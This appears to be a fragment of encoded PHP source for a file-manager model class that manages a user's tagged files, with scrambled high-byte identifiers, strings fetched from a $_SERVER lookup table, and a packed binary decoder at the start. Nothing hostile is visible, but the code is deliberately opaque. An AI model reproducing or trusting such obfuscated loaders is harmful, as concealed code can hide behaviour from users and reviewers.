1\20\347\11\251\246\23\362\150\10\51\361\154\221\60\252\243\254\135\165\167\147\67\301\102\26\307\222\347\326\204\146\215\133\111\125\1\212"."\246\112\340\320\156\36\203\317\364\154\262\207\344\21\16\316\166\340\13\1\300\255\150\304\362\157\117\262\153\214\240\250\324\243\373\302\45\350\224\50\110\331\366\377\7\267\157\354\152\33\305\0\0".""."", 10, -8))); goto c‹…é×†¹¯; EææÇ­óÂ×: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($»Ø×É“¦) { $ ¿½²ƒ =& $_SERVER[¿ÈˆÑ¸ä]; return array($ ¿½²ƒ[2234] => array($ ¿½²ƒ[2665] . USER_ID, $ ¿½²ƒ[2235])); } protected function ___listData() { $˜¾¨åÀ =& $_SERVER[¿ÈˆÑ¸ä]; $ÆŠ à¡¸ = array($˜¾¨åÀ[1907] => USER_ID, $˜¾¨åÀ[569] => array($˜¾¨åÀ[2238], 0)); $±›ø±Î = $˜¾¨åÀ[2666]; $–§ä©öÆ = $this->field($±›ø±Î)->where($ÆŠ à¡¸)->order($˜¾¨åÀ[2240])->select(); return $–§ä©öÆ ? $–§ä©öÆ : array(); } protected function addToTag($Î¦àÍ•°, $’á³–İ) { $ü“ğ¡‰ó =& $_SERVER[¿ÈˆÑ¸ä]; if (!Model($ü“ğ¡‰ó[2391])->listData($’á³–İ)) { return !1; } if (is_numeric($Î¦àÍ•°)) { $é¦áÉ¶³ = Model($ü“ğ¡‰ó[916])->pathInfo($Î¦àÍ•°); if (!$é¦áÉ¶³) { return !1; } } else { $é¦áÉ¶³ = IO::infoSimple($Î¦àÍ•°); if (!$é¦áÉ¶³) { return !1; } $Òƒ€ôéÑ = $é¦áÉ¶³[$ü“ğ¡‰ó[32]]; $î“åÓÑ = $é¦áÉ¶³[$ü“ğ¡‰ó[33]]; if (isset($é¦áÉ¶³[$ü“ğ¡‰ó[496]])) { $î“åÓÑ = $é¦áÉ¶³[$ü“ğ¡‰ó[496]] == $ü“ğ¡‰ó[91] ? $ü“ğ¡‰ó[78] : $ü“ğ¡‰ó[231]; } } $çÊûÍÛ± = array($ü“ğ¡‰ó[1907] => USER_ID, $ü“ğ¡‰ó[569] => $’á³–İ, $ü“ğ¡‰ó[506] => $Î¦àÍ•°, $ü“ğ¡‰ó[507] => $î“åÓÑ ? $î“åÓÑ : $ü“ğ¡‰ó[501], $ü“ğ¡‰ó[505] => $Òƒ€ôéÑ ? $Òƒ€ôéÑ : $ü“ğ¡‰ó[12], $ü“ğ¡‰ó[2126] => 0); if ($this->where($çÊûÍÛ±)->find()) { return !1; } return $this->add($çÊûÍÛ±); } protected function removeFromTag($™°©†èŒ, $““—Ã®Î) { $øè»½ =& $_SERVER[¿ÈˆÑ¸ä]; if (!Model($øè»½[2391])->listData($““—Ã®Î)) { return !1; } if (is_array($™°©†èŒ)) { $™°©†èŒ = array($øè»½[7], $™°©†èŒ); } $°ïü¶×Õ = array($øè»½[1907] => USER_ID, $øè»½[569] => $““—Ã®Î, $øè»½[506] => $™°©†èŒ); return $this->where($°ïü¶×Õ)->delete(); } protected function removeByTag($ğ›¸¼¡Á) { $İ¦‹Îéû =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ğ›¸¼¡Á) { return !1; } $š¸ÒëÉ = array($İ¦‹Îéû[1907] => USER_ID, $İ¦‹Îéû[569] => $ğ›¸¼¡Á); return $this->where($š¸ÒëÉ)->delete(); } protected function removeBySource($œŒı¾†ş) { $¹´À–ˆµ =& $_SERVER[¿ÈˆÑ¸ä]; if (is_array($œŒı¾†ş)) { $œŒı¾†ş = array($¹´À–ˆµ[7], $œŒı¾†ş); } $è²ñûĞÈ = array($¹´À–ˆµ[1907] => USER_ID, $¹´À–ˆµ[569] => array($¹´À–ˆµ[1117], 0), $¹´À–ˆµ[506] => $œŒı¾†ş); return $this->where($è²ñûĞÈ)->delete(); } }